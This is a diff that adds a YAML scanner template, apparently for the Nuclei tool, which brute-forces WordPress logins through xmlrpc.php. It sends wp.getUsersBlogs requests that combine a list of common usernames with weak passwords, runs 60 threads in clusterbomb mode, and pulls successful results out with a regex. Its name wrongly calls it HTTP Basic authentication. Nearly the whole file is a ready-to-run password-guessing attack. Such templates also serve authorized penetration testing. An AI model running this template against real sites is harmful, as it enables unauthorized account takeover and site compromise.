@@ -1,0 +1,71 @@
+id:  wp-xmlrpc-bruteforce
+info:
+  name: HTTP Basic authentication Bruteforce
+  author: Caddyshack2175
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /xmlrpc.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+        Connection: close
+        Content-Length: 173
+
+        <methodCall>
+        <methodName>wp.getUsersBlogs</methodName>
+        <params>
+        <param><value>{{username}}</value></param>
+        <param><value>{{password}}</value></param>
+        </params>
+        </methodCall>
+
+    payloads:
+      username:
+        - adm
+        - admin
+        - user
+        - admin1
+        - hostname
+        - manager
+        - qwerty
+        - root
+        - support
+        - sysadmin
+        - test
+        - wordpress
+      password:
+        - admin
+        - 123456
+        - password
+        - 12345678
+        - 666666
+        - 111111
+        - 1234567
+        - qwerty
+        - siteadmin
+        - administrator
+        - root
+        - 123123
+        - 123321
+        - 1234567890
+        - letmein123
+        - test123
+        - demo123
+        - pass123
+        - 123qwe
+        - qwe123
+        - 654321
+        - loveyou
+        - adminadmin123
+    attack: clusterbomb # Available options: sniper, pitchfork and clusterbomb
+    threads: 60
+    redirects: false
+    stop-at-first-match: false
+    extractors:
+      - type: regex
+        name: WordPress XMLRPC Bruteforce
+        group: 1
+        regex:
+          - '<member><name>(.*)</name><value>'
